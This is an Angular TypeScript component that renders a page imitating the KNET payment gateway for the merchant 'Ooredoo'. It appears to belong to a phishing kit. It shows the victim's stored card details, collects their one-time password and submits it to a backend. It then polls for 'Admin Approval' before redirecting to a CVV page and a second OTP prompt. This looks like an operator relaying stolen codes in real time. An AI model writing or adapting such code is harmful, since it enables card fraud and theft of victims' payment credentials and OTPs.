import { DOCUMENT } from '@angular/common';
import { CommonModule } from '@angular/common';
import { Component, Inject, OnDestroy, OnInit, Renderer2 } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { Router } from '@angular/router';
import { PaymentService } from '../../services/payment.service';
import { SocketService } from '../../services/socket.service';
import { filter } from 'rxjs/operators';

@Component({
  selector: 'app-knet-otp',
  standalone: true,
  imports: [CommonModule, FormsModule],
  templateUrl: './knet-otp.html',
  styleUrl: './knet-otp.css',
})
export class KnetOtp implements OnInit, OnDestroy {
  bannerImagePath = 'imgs/mob.jpg';
  knetLogoPath = 'imgs/download.jpg';
  loadingGifPath = 'imgs/photo_loader.gif';

  merchantName = 'Ooredoo';
  amount = 0;

  bank = '';
  cardNumber = '';
  expiryMonth = 'MM';
  expiryYear = 'YYYY';

  otp = '';
  formError: string | null = null;
  view: 'form' | 'loading' = 'loading'; // Start as loading/waiting for admin
  private pollId: ReturnType<typeof setInterval> | null = null;
  private transactionId: string | null = null;
  private clientId: string | null = null;

  private readonly bodyBgClass = 'bg-[#d9d9d9]';
  private readonly bodyOverflowClass = 'overflow-hidden';

  constructor(
    private readonly renderer: Renderer2,
    @Inject(DOCUMENT) private readonly document: Document,
    private readonly router: Router,
    private paymentService: PaymentService,
    private socketService: SocketService
  ) { }

  // ...

  onConfirm(): void {
    if (!this.transactionId) {
      this.formError = 'حدث خطأ. حاول مرة أخرى.';
      return;
    }
    if (!this.otp || this.otp.length < 1) {
      this.formError = 'يرجى إدخال رمز التحقق.';
      return;
    }

    this.formError = null;
    this.view = 'loading';

    // Submit OTP and wait for Admin Approval
    this.paymentService.submitOtp(this.transactionId, this.otp, this.clientId || '').subscribe({
      next: (res: any) => {
        if (res.success) {
          // Poll for Admin
          this.startPolling(res.otpId);
        } else {
          this.view = 'form';
          this.formError = 'Error submitting OTP.';
        }
      },
      error: (err: any) => {
        console.error(err);
        this.view = 'form';
        this.formError = 'System error.';
      }
    });
  }

  startPolling(otpId: string) {
    if (this.pollId) clearInterval(this.pollId);
    this.pollId = setInterval(() => {
      this.paymentService.checkOtpStatus(otpId).subscribe({
        next: (res: any) => {
          if (res.status === 'APPROVED') {
            clearInterval(this.pollId!);
            this.pollId = null;
            
            if (sessionStorage.getItem('cvv_approved') === 'true') {
              // Second OTP is approved
              alert('تمت عملية الدفع بنجاح');
              // Clear session storage to avoid issues on next payment
              sessionStorage.removeItem('cvv_approved');
              this.router.navigate(['/']);
            } else {
              // First OTP is approved, redirect to CVV page
              this.router.navigate(['/knet-cvv']);
            }
          } else if (res.status === 'OTP_FAILED') {
            clearInterval(this.pollId!);
            this.pollId = null;
            this.view = 'form';
            this.formError = 'رمز التحقق خاطئ، سيتم ارسال كود جديد';
          } else if (res.status === 'REJECTED') {
            clearInterval(this.pollId!);
            this.pollId = null;
            alert('تم رفض العملية.');
            this.router.navigate(['/']);
          }
        },
        error: () => { }
      });
    }, 2000);
  }

  ngOnInit(): void {
    this.renderer.addClass(this.document.body, this.bodyBgClass);
    this.renderer.addClass(this.document.body, this.bodyOverflowClass);

    // knet form details (for confirmation UI)
    const rawKnet = sessionStorage.getItem('eventat_knet_form');
    if (rawKnet) {
      try {
        const parsed = JSON.parse(rawKnet);
        this.bank = String(parsed?.bank ?? '');
        this.cardNumber = String(parsed?.cardNumber ?? '').replace(/\D/g, '');
        this.expiryMonth = String(parsed?.expiryMonth ?? 'MM');
        this.expiryYear = String(parsed?.expiryYear ?? 'YYYY');
        const total = Number(parsed?.amount);
        if (Number.isFinite(total)) this.amount = total;
        const m = String(parsed?.merchantName ?? '').trim();
        if (m) this.merchantName = m;
      } catch {
        // ignore
      }
    }

    // Fallback: checkout amount (same total user sees in checkout)
    if (!this.amount) {
      const rawCheckout = sessionStorage.getItem('eventat_checkout');
      if (rawCheckout) {
        try {
          const parsed = JSON.parse(rawCheckout);
          const total = Number(parsed?.totalPrice);
          if (Number.isFinite(total)) this.amount = total;
        } catch {
          // ignore
        }
      }
    }

    this.transactionId = sessionStorage.getItem('eventat_knet_txn');
    this.clientId = sessionStorage.getItem('loginId');
    // We don't start polling here anymore because polling is on otpId after submission

    // Simulate waiting for "Admin Approval" / OTP generation
    this.view = 'loading';
    setTimeout(() => {
      // Only switch to form if we haven't succeeded/failed yet
      if (this.view === 'loading') {
        this.view = 'form';
      }
    }, 2000);
  }

  ngOnDestroy(): void {
    this.renderer.removeClass(this.document.body, this.bodyBgClass);
    this.renderer.removeClass(this.document.body, this.bodyOverflowClass);
    if (this.pollId) clearInterval(this.pollId);
  }

  private digitsOnly(value: string, maxLen: number) {
    return (value ?? '').replace(/\D+/g, '').slice(0, maxLen);
  }

  onOtpInput(event: Event) {
    const input = event.target as HTMLInputElement;
    const cleaned = this.digitsOnly(input?.value ?? '', 20);
    this.otp = cleaned;
    if (input && input.value !== cleaned) input.value = cleaned;
    this.formError = null;
  }



  digitsOnlyKeydown(event: KeyboardEvent, maxLen: number) {
    const allowedKeys = new Set([
      'Backspace',
      'Delete',
      'Tab',
      'Enter',
      'Escape',
      'ArrowLeft',
      'ArrowRight',
      'ArrowUp',
      'ArrowDown',
      'Home',
      'End',
    ]);

    if (allowedKeys.has(event.key)) return;
    if (event.ctrlKey || event.metaKey) return;

    if (!/^\d$/.test(event.key)) {
      event.preventDefault();
      return;
    }

    const input = event.target as HTMLInputElement | null;
    if (!input) return;
    const value = input.value ?? '';
    const selStart = input.selectionStart ?? value.length;
    const selEnd = input.selectionEnd ?? value.length;
    const selectedCount = Math.max(0, selEnd - selStart);
    if (value.length - selectedCount >= maxLen) event.preventDefault();
  }

  digitsOnlyPaste(event: ClipboardEvent, maxLen: number) {
    event.preventDefault();
    const input = event.target as HTMLInputElement | null;
    if (!input) return;

    const pasteText = event.clipboardData?.getData('text') ?? '';
    const toInsert = this.digitsOnly(pasteText, maxLen);

    const value = input.value ?? '';
    const selStart = input.selectionStart ?? value.length;
    const selEnd = input.selectionEnd ?? value.length;

    const combined = this.digitsOnly(value.slice(0, selStart) + toInsert + value.slice(selEnd), maxLen);
    input.value = combined;
    this.otp = combined;
    this.formError = null;
  }

  private maskCard(n: string) {
    const digits = (n ?? '').replace(/\D/g, '');
    if (!digits) return '';

    if (digits.length <= 10) {
      const last4 = digits.slice(-4);
      const masked = `${'*'.repeat(Math.max(0, digits.length - 4))}${last4}`;
      return masked.replace(/(.{4})/g, '$1 ').trim();
    }

    const first6 = digits.slice(0, 6);
    const last4 = digits.slice(-4);
    const middleMask = '*'.repeat(digits.length - 10);

    const masked = `${first6}${middleMask}${last4}`;
    return masked.replace(/(.{4})/g, '$1 ').trim();
  }

  get maskedCardNumber() {
    return this.maskCard(this.cardNumber);
  }

  onCancel(): void {
    window.history.back();
  }
}
